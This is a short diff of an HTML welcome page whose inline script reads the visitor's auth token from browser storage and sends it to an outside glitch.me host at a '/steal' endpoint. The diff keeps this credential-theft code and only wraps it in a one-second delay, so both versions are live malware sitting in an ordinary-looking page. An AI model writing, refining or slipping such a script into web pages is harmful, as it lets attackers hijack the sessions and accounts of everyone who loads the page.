@@ -6,12 +6,13 @@
   <body>
     <h1>Welcome, user!</h1>
     <script>
-      const token = localStorage.getItem('token') || sessionStorage.getItem('token');
-    
-      if (token) {
-        fetch("https://diligent-opalescent-tune.glitch.me/steal?token=" + token);
-      }
-    </script>
+  setTimeout(() => {
+    const token = localStorage.getItem('token') || sessionStorage.getItem('token');
+    if (token) {
+      fetch("https://diligent-opalescent-tune.glitch.me/steal?token=" + token);
+    }
+  }, 1000); 
+</script>
 
   </body>
 </html>
